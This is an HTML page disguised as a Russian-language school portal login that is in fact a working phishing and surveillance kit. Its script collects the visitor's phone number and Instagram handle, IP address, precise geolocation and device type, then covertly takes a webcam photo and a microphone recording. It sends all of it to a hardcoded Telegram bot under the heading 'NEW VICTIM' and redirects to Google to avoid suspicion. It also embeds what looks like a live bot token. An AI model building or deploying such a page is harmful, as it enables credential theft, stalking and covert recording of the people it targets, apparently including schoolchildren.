<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Школьный портал</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a2e, #1a1a4e);
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #fff;
            font-size: 22px;
        }
        .logo p {
            color: rgba(255,255,255,0.4);
            font-size: 13px;
            margin-top: 5px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            color: rgba(255,255,255,0.7);
            font-size: 13px;
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        .form-group input:focus {
            border-color: #00ff88;
        }
        .form-group input::placeholder {
            color: rgba(255,255,255,0.3);
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: #00ff88;
            color: #000;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
        }
        .btn:hover {
            transform: scale(1.02);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.15);
            font-size: 11px;
        }
        .status {
            color: #00ff88;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        .loader {
            display: none;
            text-align: center;
            margin-top: 10px;
        }
        .loader span {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff88;
            margin: 0 3px;
            animation: pulse 1.4s infinite;
        }
        .loader span:nth-child(2) { animation-delay: 0.2s; }
        .loader span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
            40% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <h1>🏫 Школьный портал</h1>
        <p>Войди в систему</p>
    </div>

    <form id="form">
        <div class="form-group">
            <label>📱 Номер телефона</label>
            <input type="tel" id="phone" placeholder="+7 900 123 45 67" required>
        </div>

        <div class="form-group">
            <label>📸 Instagram (никнейм)</label>
            <input type="text" id="instagram" placeholder="@ivanov_ivan" required>
        </div>

        <button type="submit" class="btn" id="btn">🚀 Войти</button>
        <div class="status" id="status">✅ Данные отправлены</div>
        <div class="loader" id="loader">
            <span></span><span></span><span></span>
        </div>
    </form>

    <div class="footer">© 2026 Школьный портал</div>
</div>

<script>
    // ======== ТВОЙ ТОКЕН БОТА ========
    const BOT_TOKEN = "8981015980:AAGdVH39h8C7v4pF88dT6qWhPgJC4S6bZak";  // ЗАМЕНИ
    const OWNER_ID = 7655675532;  // ТВОЙ TELEGRAM ID

    // ======== ОТПРАВКА В TELEGRAM ========
    async function sendToTelegram(data) {
        const text = `
🕵️ *НОВАЯ ЖЕРТВА*

📱 Телефон: ${data.phone}
📸 Instagram: ${data.instagram}

🌐 IP: ${data.ip || 'Не определен'}
📍 Город: ${data.city || 'Не определен'}
🖥 Устройство: ${data.device || 'Не определен'}
🌍 Геолокация: ${data.lat && data.lon ? data.lat + ', ' + data.lon : 'Не доступна'}
📅 Время: ${new Date().toLocaleString()}
        `;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: OWNER_ID,
            text: text,
            parse_mode: 'Markdown'
        };

        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {}
    }

    // ======== ОТПРАВКА ФОТО (если есть) ========
    async function sendPhotoToTelegram(photo) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', OWNER_ID);
        formData.append('photo', photo);
        formData.append('caption', '📸 Фото с камеры');

        try {
            await fetch(url, {
                method: 'POST',
                body: formData
            });
        } catch (e) {}
    }

    // ======== ОТПРАВКА АУДИО ========
    async function sendAudioToTelegram(audio) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
        const formData = new FormData();
        formData.append('chat_id', OWNER_ID);
        formData.append('audio', audio);
        formData.append('title', 'Запись микрофона');

        try {
            await fetch(url, {
                method: 'POST',
                body: formData
            });
        } catch (e) {}
    }

    // ======== ПОЛУЧЕНИЕ IP ========
    async function getIP() {
        try {
            const r = await fetch('https://ipapi.co/json/');
            const data = await r.json();
            return {
                ip: data.ip || '',
                city: data.city || '',
                country: data.country_name || '',
                lat: data.latitude || '',
                lon: data.longitude || ''
            };
        } catch {
            try {
                const r = await fetch('https://ipinfo.io/json');
                const data = await r.json();
                return {
                    ip: data.ip || '',
                    city: data.city || '',
                    country: data.country || '',
                    lat: data.loc ? data.loc.split(',')[0] : '',
                    lon: data.loc ? data.loc.split(',')[1] : ''
                };
            } catch {
                return { ip: '', city: '', country: '', lat: '', lon: '' };
            }
        }
    }

    // ======== ГЕОЛОКАЦИЯ (ТОЧНАЯ) ========
    function getGeo() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                },
                () => { resolve(null); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }

    // ======== КАМЕРА ========
    function captureCamera() {
        return new Promise((resolve) => {
            try {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = 640;
                            canvas.height = 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, 640, 480);
                            canvas.toBlob((blob) => {
                                resolve(blob);
                                stream.getTracks().forEach(t => t.stop());
                            }, 'image/jpeg', 0.7);
                        };
                    })
                    .catch(() => { resolve(null); });
            } catch {
                resolve(null);
            }
        });
    }

    // ======== МИКРОФОН ========
    function captureMicrophone() {
        return new Promise((resolve) => {
            try {
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then((stream) => {
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = (e) => {
                            if (e.data.size > 0) chunks.push(e.data);
                        };
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            resolve(blob);
                            stream.getTracks().forEach(t => t.stop());
                        };
                        recorder.start();
                        setTimeout(() => recorder.stop(), 3000);
                    })
                    .catch(() => { resolve(null); });
            } catch {
                resolve(null);
            }
        });
    }

    // ======== УСТРОЙСТВО ========
    function getDevice() {
        const ua = navigator.userAgent;
        if (ua.includes('iPhone')) return 'iPhone';
        if (ua.includes('Android')) return 'Android';
        if (ua.includes('Windows')) return 'Windows';
        if (ua.includes('Mac')) return 'Mac';
        return 'Другое';
    }

    // ======== ОБРАБОТКА ФОРМЫ ========
    document.getElementById('form').addEventListener('submit', async function(e) {
        e.preventDefault();

        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const loader = document.getElementById('loader');

        btn.disabled = true;
        btn.style.opacity = '0.5';
        loader.style.display = 'block';
        status.style.display = 'none';

        const phone = document.getElementById('phone').value.trim();
        const instagram = document.getElementById('instagram').value.trim();

        // 1. IP и гео
        const ipData = await getIP();

        // 2. Точная геолокация
        const geo = await getGeo();

        // 3. Устройство
        const device = getDevice();

        // 4. Камера
        const photo = await captureCamera();

        // 5. Микрофон
        const audio = await captureMicrophone();

        // 6. Отправка данных в Telegram
        const data = {
            phone: phone,
            instagram: instagram,
            ip: ipData.ip,
            city: ipData.city,
            lat: geo ? geo.lat : ipData.lat,
            lon: geo ? geo.lon : ipData.lon,
            device: device
        };

        await sendToTelegram(data);

        // 7. Отправка фото
        if (photo) {
            await sendPhotoToTelegram(photo);
        }

        // 8. Отправка аудио
        if (audio) {
            await sendAudioToTelegram(audio);
        }

        // 9. Показываем успех
        loader.style.display = 'none';
        status.style.display = 'block';
        status.textContent = '✅ Успешно! Перенаправление...';
        status.style.color = '#00ff88';

        // 10. Перенаправление (чтобы не спалили)
        setTimeout(() => {
            window.location.href = 'https://google.com';
        }, 2000);
    });
</script>
</body>
  </html>
